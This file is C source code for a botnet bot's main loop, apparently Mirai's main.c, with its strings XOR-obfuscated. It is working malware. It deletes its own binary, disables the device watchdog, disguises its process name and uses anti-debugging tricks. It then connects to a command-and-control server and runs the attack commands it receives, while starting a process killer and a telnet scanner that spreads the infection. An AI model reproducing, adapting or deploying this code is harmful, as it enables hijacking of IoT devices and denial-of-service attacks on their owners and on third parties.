#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "resolv.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf((char*)util_decrypt("\x4D\x65\x7E\x2A\x59\x43\x4D\x59\x4F\x4D\x5C\x2A\x6B\x7E\x2A\x6B\x6E\x6E\x78\x6F\x79\x79\x30\x2A\x3A\x72\x2F\x66\x72\x00\x0A", 31), (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
    sigset_t sigs;
    int wfd;

    // Delete self
    unlink(args[0]);

    // Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, &anti_gdb_entry);

    // Prevent watchdog from rebooting device
    if ((wfd = open((char*)util_decrypt("\x25\x6E\x6F\x7C\x25\x7D\x6B\x7E\x69\x62\x6E\x65\x6D\x0A", 14), 2)) != -1 ||
        (wfd = open((char*)util_decrypt("\x25\x6E\x6F\x7C\x25\x67\x63\x79\x69\x25\x7D\x6B\x7E\x69\x62\x6E\x65\x6D\x0A", 19), 2)) != -1)
    {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir((char*)util_decrypt("\x25\x0A", 2));
#endif

#ifdef DEBUG
    printf((char*)util_decrypt("\x4E\x4F\x48\x5F\x4D\x2A\x47\x45\x4E\x4F\x2A\x53\x45\x00\x0A", 15));

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror((char*)util_decrypt("\x79\x63\x6D\x6B\x69\x7E\x63\x65\x64\x0A", 10));

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror((char*)util_decrypt("\x79\x63\x6D\x6B\x69\x7E\x63\x65\x64\x0A", 10));
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

#ifdef DEBUG
    unlock_tbl_if_nodebug(args[0]);
    anti_gdb_entry(0);
#else
    if (unlock_tbl_if_nodebug(args[0]))
        raise(SIGTRAP);
#endif

    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, (char*)util_decrypt("\x00\x0A", 2), 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    killer_init();
#ifndef DEBUG
#ifdef MIRAI_TELNET
    scanner_init();
#endif
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf((char*)util_decrypt("\x79\x6F\x66\x6F\x69\x7E\x22\x23\x2A\x6F\x78\x78\x64\x65\x2A\x37\x2A\x2F\x6E\x00\x0A", 21), errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4E\x6F\x7E\x6F\x69\x7E\x6F\x6E\x2A\x64\x6F\x7D\x6F\x78\x2A\x63\x64\x79\x7E\x6B\x64\x69\x6F\x2A\x78\x7F\x64\x64\x63\x64\x6D\x2B\x2A\x41\x63\x66\x66\x63\x64\x6D\x2A\x79\x6F\x66\x6C\x00\x0A", 54));
#endif
#ifdef MIRAI_TELNET
            scanner_kill();
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x5E\x63\x67\x6F\x6E\x2A\x65\x7F\x7E\x2A\x7D\x62\x63\x66\x6F\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x64\x6D\x2A\x7E\x65\x2A\x49\x44\x49\x00\x0A", 42));
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4F\x78\x78\x65\x78\x2A\x7D\x62\x63\x66\x6F\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x64\x6D\x2A\x7E\x65\x2A\x49\x44\x49\x2A\x69\x65\x6E\x6F\x37\x2F\x6E\x00\x0A", 46), err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, (char*)util_decrypt("\x0A\x0A\x0A\x0B", 4), 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x49\x65\x64\x64\x6F\x69\x7E\x6F\x6E\x2A\x7E\x65\x2A\x49\x44\x49\x24\x2A\x46\x65\x69\x6B\x66\x2A\x6B\x6E\x6E\x78\x6F\x79\x79\x2A\x37\x2A\x2F\x6E\x00\x0A", 45), LOCAL_ADDR);
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x46\x65\x79\x7E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x7D\x63\x7E\x62\x2A\x49\x44\x49\x2A\x22\x6F\x78\x78\x64\x65\x2A\x37\x2A\x2F\x6E\x23\x2A\x3B\x00\x0A", 48), errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x46\x65\x79\x7E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x7D\x63\x7E\x62\x2A\x49\x44\x49\x2A\x22\x6F\x78\x78\x64\x65\x2A\x37\x2A\x2F\x6E\x23\x2A\x38\x00\x0A", 48), errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x58\x6F\x69\x6F\x63\x7C\x6F\x6E\x2A\x2F\x6E\x2A\x68\x73\x7E\x6F\x79\x2A\x6C\x78\x65\x67\x2A\x49\x44\x49\x00\x0A", 35), len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x78\x6F\x79\x65\x66\x7C\x6F\x2A\x49\x44\x49\x2A\x6B\x6E\x6E\x78\x6F\x79\x79\x00\x0A", 38));
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x58\x6F\x79\x65\x66\x7C\x6F\x6E\x2A\x6E\x65\x67\x6B\x63\x64\x00\x0A", 24));
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4B\x7E\x7E\x6F\x67\x7A\x7E\x63\x64\x6D\x2A\x7E\x65\x2A\x69\x65\x64\x64\x6F\x69\x7E\x2A\x7E\x65\x2A\x49\x44\x49\x00\x0A", 37));
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x69\x6B\x66\x66\x2A\x79\x65\x69\x61\x6F\x7E\x22\x23\x24\x2A\x4F\x78\x78\x64\x65\x2A\x37\x2A\x2F\x6E\x00\x0A", 44), errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x5E\x6F\x6B\x78\x63\x64\x6D\x2A\x6E\x65\x7D\x64\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x7E\x65\x2A\x49\x44\x49\x2B\x00\x0A", 40));
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4B\x64\x65\x7E\x62\x6F\x78\x2A\x63\x64\x79\x7E\x6B\x64\x69\x6F\x2A\x63\x79\x2A\x6B\x66\x78\x6F\x6B\x6E\x73\x2A\x78\x7F\x64\x64\x63\x64\x6D\x2A\x22\x6F\x78\x78\x64\x65\x2A\x37\x2A\x2F\x6E\x23\x2B\x2A\x59\x6F\x64\x6E\x63\x64\x6D\x2A\x61\x63\x66\x66\x2A\x78\x6F\x7B\x7F\x6F\x79\x7E\x24\x24\x24\x07\x00\x0A", 83), errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x69\x65\x64\x64\x6F\x69\x7E\x2A\x7E\x65\x2A\x6C\x6E\x55\x69\x7E\x78\x66\x2A\x7E\x65\x2A\x78\x6F\x7B\x7F\x6F\x79\x7E\x2A\x7A\x78\x65\x69\x6F\x79\x79\x2A\x7E\x6F\x78\x67\x63\x64\x6B\x7E\x63\x65\x64\x00\x0A", 68));
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x4C\x6B\x63\x66\x6F\x6E\x2A\x7E\x65\x2A\x69\x6B\x66\x66\x2A\x66\x63\x79\x7E\x6F\x64\x22\x23\x2A\x65\x64\x2A\x6C\x6E\x55\x69\x7E\x78\x66\x00\x0A", 43));
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
#ifdef DEBUG
        printf((char*)util_decrypt("\x51\x67\x6B\x63\x64\x57\x2A\x5D\x6F\x2A\x6B\x78\x6F\x2A\x7E\x62\x6F\x2A\x65\x64\x66\x73\x2A\x7A\x78\x65\x69\x6F\x79\x79\x2A\x65\x64\x2A\x7E\x62\x63\x79\x2A\x79\x73\x79\x7E\x6F\x67\x2B\x00\x0A", 48));
#endif
    }
}

static BOOL unlock_tbl_if_nodebug(char *argv0)
{
    // ./dvrHelper = 0x2e 0x2f 0x64 0x76 0x72 0x48 0x65 0x6c 0x70 0x65 0x72
    char buf_src[18] = {}, buf_dst[12];
    char * v1 = (char*)util_decrypt("\x25\x24\x0A\x7C\x6E\x0A\x42\x78\x0A\x66\x6F\x0A\x6F\x7A\x0A\x0A\x78\x0A", 18);
    memcpy(buf_src, v1, 18);
    int i, ii = 0, c = 0;
    uint8_t fold = 0xAF;
    void (*obf_funcs[]) (void) = {
        (void (*) (void))ensure_single_instance,
        (void (*) (void))table_unlock_val,
        (void (*) (void))table_retrieve_val,
        (void (*) (void))table_init, // This is the function we actually want to run
        (void (*) (void))table_lock_val,
        (void (*) (void))util_memcpy,
        (void (*) (void))util_strcmp,
        (void (*) (void))killer_init,
        (void (*) (void))anti_gdb_entry
    };
    BOOL matches;

    for (i = 0; i < 7; i++)
        c += (long)obf_funcs[i];
    if (c == 0)
        return FALSE;

    // We swap every 2 bytes: e.g. 1, 2, 3, 4 -> 2, 1, 4, 3
    for (i = 0; i < sizeof (buf_src); i += 3)
    {
        char tmp = buf_src[i];

        buf_dst[ii++] = buf_src[i + 1];
        buf_dst[ii++] = tmp;

        // Meaningless tautology that gets you right back where you started
        i *= 2;
        i += 14;
        i /= 2;
        i -= 7;

        // Mess with 0xAF
        fold += ~argv0[ii % util_strlen(argv0)];
    }
    fold %= (sizeof (obf_funcs) / sizeof (void *));
    
#ifndef DEBUG
    (obf_funcs[fold])();
    matches = util_strcmp(argv0, buf_dst);
    util_zero(buf_src, sizeof (buf_src));
    util_zero(buf_dst, sizeof (buf_dst));
    return matches;
#else
    table_init();
    return TRUE;
#endif
}
